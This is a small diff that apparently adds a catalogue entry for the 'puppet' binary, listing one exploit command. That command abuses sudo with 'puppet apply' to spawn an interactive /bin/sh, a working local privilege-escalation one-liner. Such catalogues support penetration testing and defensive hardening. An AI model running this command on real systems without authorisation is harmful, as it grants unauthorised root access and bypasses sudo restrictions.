@@ -1,0 +1,4 @@
+name: puppet
+binary_path: /usr/bin/puppet
+exploit_cmds:
+- 'sudo /usr/bin/puppet apply -e "exec { ''/bin/sh <$(tty) >$(tty) 2>$(tty)'': }"'
